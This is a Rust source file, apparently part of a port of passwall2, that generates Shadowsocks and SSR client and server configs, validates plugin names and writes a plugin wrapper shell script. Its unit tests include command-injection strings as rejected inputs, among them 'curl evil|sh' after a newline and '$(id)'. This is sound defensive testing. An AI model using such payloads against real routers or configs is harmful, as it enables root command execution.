//! Port of `luasrc/passwall2/util_shadowsocks.lua` (spec 05 §3): config generator for the
//! SSR (`ssr-local`) and shadowsocks-rust (`sslocal`) clients started by `run_socks`, plus
//! the server-side variant used by `server_app`.

use crate::api;
use crate::uci::Section;
use crate::util::{Args, ArgsExt};
use serde_json::{json, Map, Value};

/// Lua `tonumber(s)` rendered the way `jsonc.stringify` prints it (integer when integral).
pub fn lua_number(s: Option<&str>) -> Option<Value> {
    let s = s?.trim();
    if let Ok(i) = s.parse::<i64>() {
        return Some(json!(i));
    }
    let f = api::lua_tonumber(s)?;
    if f.fract() == 0.0 && f.abs() < 9.0e15 {
        return Some(json!(f as i64));
    }
    serde_json::Number::from_f64(f).map(Value::Number)
}

fn put(m: &mut Map<String, Value>, k: &str, v: Option<Value>) {
    if let Some(v) = v {
        m.insert(k.to_string(), v);
    }
}
fn put_s(m: &mut Map<String, Value>, k: &str, v: Option<String>) {
    put(m, k, v.map(Value::String));
}

/// Result of [`gen_config`]: the JSON config (None when `node` is missing) and the plugin
/// wrapper to write afterwards (`plugin_sh`, `plugin_bin`).
#[derive(Debug, Clone, PartialEq)]
pub struct SsConfig {
    pub config: Option<Value>,
    pub plugin: Option<(String, String)>,
}

/// `gen_config(var)` (client). `node` is the UCI node section named by `var.node`.
pub fn gen_config(node: Option<&Section>, var: &Args) -> SsConfig {
    let Some(node) = node.filter(|_| var.g("node").is_some()) else {
        return SsConfig { config: None, plugin: None };
    };
    let mut server_host = var.g("server_host").map(|s| s.to_string()).unwrap_or_else(|| node.s("address").to_lowercase());
    let server_port = var.g("server_port").map(|s| s.to_string()).or_else(|| node.get("port"));
    let local_socks_address = var.g("local_socks_address").unwrap_or("0.0.0.0").to_string();
    let local_socks_port = var.g("local_socks_port");
    let local_http_address = var.g("local_http_address").unwrap_or("0.0.0.0").to_string();
    let local_http_port = var.g("local_http_port");

    if api::is_ipv6(&server_host) {
        server_host = api::get_ipv6_only(&server_host);
    }
    let server = server_host;

    let mut plugin_file: Option<String> = None;
    let mut plugin: Option<(String, String)> = None;
    let np = node.s("plugin");
    if !np.is_empty() && np != "none" && !is_valid_plugin(&np) {
        // the value comes from share links / subscriptions; it ends up in a root shell script
        api::log(1, &format!("Invalid SS plugin name ignored: {}", np.escape_debug()));
    } else if !np.is_empty() && np != "none" {
        let sh = var.g("plugin_sh").unwrap_or("").to_string();
        plugin_file = Some(if !sh.is_empty() { sh.clone() } else { np.clone() });
        plugin = Some((sh, np.clone()));
    }
    let fast_open = node.get("tcp_fast_open").as_deref() == Some("1");

    let t = node.s("type");
    let config = if t == "SS-Rust" {
        let mut srv = Map::new();
        srv.insert("address".into(), Value::String(server.clone()));
        put(&mut srv, "port", lua_number(server_port.as_deref()));
        put_s(&mut srv, "method", node.get("method"));
        put_s(&mut srv, "password", node.get("password"));
        put(&mut srv, "timeout", lua_number(node.get("timeout").as_deref()));
        if let Some(pf) = &plugin_file {
            srv.insert("plugin".into(), Value::String(pf.clone()));
            put_s(&mut srv, "plugin_opts", node.get("plugin_opts"));
        }
        let mut locals = vec![];
        if local_socks_port.is_some() {
            let mut l = Map::new();
            l.insert("local_address".into(), Value::String(local_socks_address));
            put(&mut l, "local_port", lua_number(local_socks_port));
            l.insert("mode".into(), json!("tcp_and_udp"));
            locals.push(Value::Object(l));
        }
        if local_http_port.is_some() {
            let mut l = Map::new();
            l.insert("protocol".into(), json!("http"));
            l.insert("local_address".into(), Value::String(local_http_address));
            put(&mut l, "local_port", lua_number(local_http_port));
            locals.push(Value::Object(l));
        }
        json!({ "servers": [Value::Object(srv)], "locals": locals, "fast_open": fast_open })
    } else {
        let mut m = Map::new();
        m.insert("server".into(), Value::String(server));
        put(&mut m, "server_port", lua_number(server_port.as_deref()));
        put_s(&mut m, "local_address", var.g("local_addr").map(|s| s.to_string()));
        put(&mut m, "local_port", lua_number(var.g("local_port")));
        put_s(&mut m, "password", node.get("password"));
        put_s(&mut m, "method", node.get("method"));
        put(&mut m, "timeout", lua_number(node.get("timeout").as_deref()));
        m.insert("fast_open".into(), Value::Bool(fast_open));
        m.insert("reuse_port".into(), Value::Bool(true));
        if t == "SSR" {
            put_s(&mut m, "protocol", node.get("protocol"));
            put_s(&mut m, "protocol_param", node.get("protocol_param"));
            put_s(&mut m, "obfs", node.get("obfs"));
            put_s(&mut m, "obfs_param", node.get("obfs_param"));
        }
        Value::Object(m)
    };
    SsConfig { config: Some(config), plugin }
}

/// SS plugin name/path (`obfs-local`, `v2ray-plugin`, `/usr/bin/xray-plugin`, ...):
/// `[A-Za-z0-9._+/-]+`, not starting with `-`. Anything else (spaces, `;`, `$`, newlines, ...)
/// would be shell syntax in [`plugin_script`] or an option to sslocal.
pub fn is_valid_plugin(p: &str) -> bool {
    !p.is_empty() && p.len() <= 256 && !p.starts_with('-') && p.bytes().all(|c| c.is_ascii_alphanumeric() || b"._+/-".contains(&c))
}

/// Content of the plugin wrapper script (`plugin_sh`, pid file = `.sh` → `.pid`). None for
/// an invalid plugin name (see [`is_valid_plugin`]). Both paths are shell-quoted.
pub fn plugin_script(plugin_sh: &str, plugin_bin: &str) -> Option<String> {
    if !is_valid_plugin(plugin_bin) {
        return None;
    }
    let pid = match plugin_sh.strip_suffix(".sh") {
        Some(b) => format!("{}.pid", b),
        None => plugin_sh.to_string(),
    };
    Some(format!(
        "#!/bin/sh\nexport PATH=/usr/sbin:/usr/bin:/sbin:/bin:/root/bin:$PATH\n{} \"$@\" &\necho $! > {}\nwait\n",
        crate::util::shq(plugin_bin),
        crate::util::shq(&pid)
    ))
}

/// Write the plugin wrapper (only when `plugin_sh` is non-empty) and make it executable.
pub fn write_plugin(plugin: &Option<(String, String)>) {
    if let Some((sh, bin)) = plugin {
        let Some(script) = plugin_script(sh, bin) else { return };
        if !sh.is_empty() && std::fs::write(sh, script).is_ok() {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(sh, std::fs::Permissions::from_mode(0o755));
        }
    }
}

/// `gen_config_server(node)` for a `passwall2_server` server section; `user` is the section
/// named by `node.user` (if any).
pub fn gen_config_server(node: &Section, user: Option<&Section>) -> Value {
    let mut m = Map::new();
    put(&mut m, "server_port", lua_number(node.get("port").as_deref()));
    m.insert("password".into(), Value::String(user.and_then(|u| u.get("password")).unwrap_or_default()));
    put(&mut m, "timeout", lua_number(node.get("timeout").as_deref()));
    m.insert("fast_open".into(), Value::Bool(node.get("tcp_fast_open").as_deref() == Some("1")));
    put_s(&mut m, "method", node.get("method"));
    let t = node.s("type");
    if t == "SS-Rust" {
        m.insert("server".into(), json!("::"));
        m.insert("mode".into(), json!("tcp_and_udp"));
    } else {
        m.insert("server".into(), json!(["[::0]", "0.0.0.0"]));
    }
    if t == "SSR" {
        put_s(&mut m, "protocol", node.get("protocol"));
        put_s(&mut m, "protocol_param", node.get("protocol_param"));
        put_s(&mut m, "obfs", node.get("obfs"));
        put_s(&mut m, "obfs_param", node.get("obfs_param"));
    }
    Value::Object(m)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::uci::Config;

    fn args(kv: &[(&str, &str)]) -> Args {
        kv.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    }

    #[test]
    fn ss_rust_client() {
        let c = Config::parse(
            "passwall2",
            "config nodes 'n1'\n\toption type 'SS-Rust'\n\toption address 'EX.com'\n\toption port '8388'\n\toption method 'aes-128-gcm'\n\toption password 'pw'\n\toption plugin 'obfs-local'\n\toption plugin_opts 'obfs=http'\n",
        );
        let n = c.section("n1");
        let r = gen_config(
            n,
            &args(&[("node", "n1"), ("server_host", "ex.com"), ("server_port", "8388"), ("local_socks_address", "127.0.0.1"), ("local_socks_port", "1080"), ("local_http_port", "1081"), ("plugin_sh", "/tmp/etc/passwall2/s1_plugin.sh")]),
        );
        let v = r.config.unwrap();
        assert_eq!(v["servers"][0]["address"], "ex.com");
        assert_eq!(v["servers"][0]["port"], 8388);
        assert_eq!(v["servers"][0]["plugin"], "/tmp/etc/passwall2/s1_plugin.sh");
        assert_eq!(v["servers"][0]["plugin_opts"], "obfs=http");
        assert_eq!(v["locals"][0]["local_port"], 1080);
        assert_eq!(v["locals"][1]["protocol"], "http");
        assert_eq!(v["locals"][1]["local_address"], "0.0.0.0");
        assert_eq!(v["fast_open"], false);
        assert_eq!(r.plugin, Some(("/tmp/etc/passwall2/s1_plugin.sh".into(), "obfs-local".into())));
        let sc = plugin_script("/tmp/a_plugin.sh", "obfs-local").unwrap();
        assert!(sc.contains("echo $! > '/tmp/a_plugin.pid'\n"), "{}", sc);
        assert!(sc.contains("\n'obfs-local' \"$@\" &\n"), "{}", sc);
    }

    #[test]
    fn ssr_client() {
        let c = Config::parse(
            "passwall2",
            "config nodes 'n2'\n\toption type 'SSR'\n\toption address '[2001:db8::1]'\n\toption port '443'\n\toption protocol 'origin'\n\toption obfs 'plain'\n\toption timeout '300'\n\toption tcp_fast_open '1'\n",
        );
        let r = gen_config(c.section("n2"), &args(&[("node", "n2"), ("local_addr", "0.0.0.0"), ("local_port", "1090")]));
        let v = r.config.unwrap();
        assert_eq!(v["server"], "2001:db8::1");
        assert_eq!(v["server_port"], 443);
        assert_eq!(v["local_port"], 1090);
        assert_eq!(v["timeout"], 300);
        assert_eq!(v["fast_open"], true);
        assert_eq!(v["reuse_port"], true);
        assert_eq!(v["protocol"], "origin");
        assert!(v.get("password").is_none());
        assert!(r.plugin.is_none());
        assert!(gen_config(None, &args(&[])).config.is_none());
    }

    #[test]
    fn server_cfg() {
        let c = Config::parse("passwall2_server", "config user 'u'\n\toption type 'SS-Rust'\n\toption port '9000'\n\toption method 'none'\n");
        let v = gen_config_server(c.section("u").unwrap(), None);
        assert_eq!(v["server"], "::");
        assert_eq!(v["server_port"], 9000);
        assert_eq!(v["password"], "");
    }

    #[test]
    fn plugin_injection_refused() {
        assert!(is_valid_plugin("obfs-local") && is_valid_plugin("/usr/bin/v2ray-plugin") && is_valid_plugin("xray-plugin_1.8+x"));
        for bad in ["obfs-local\ncurl evil|sh", "a;b", "a b", "$(id)", "`id`", "-x", "a|b", "a'b", ""] {
            assert!(!is_valid_plugin(bad), "{:?}", bad);
            assert!(plugin_script("/tmp/a_plugin.sh", bad).is_none());
        }
        let c = Config::parse(
            "passwall2",
            "config nodes 'n1'\n\toption type 'SS-Rust'\n\toption address 'ex.com'\n\toption port '1'\n\toption plugin 'obfs-local\ncurl evil|sh'\n",
        );
        let r = gen_config(c.section("n1"), &args(&[("node", "n1"), ("local_socks_port", "1080"), ("plugin_sh", "/tmp/x_plugin.sh")]));
        assert!(r.plugin.is_none());
        assert!(r.config.unwrap()["servers"][0].get("plugin").is_none());
    }
}
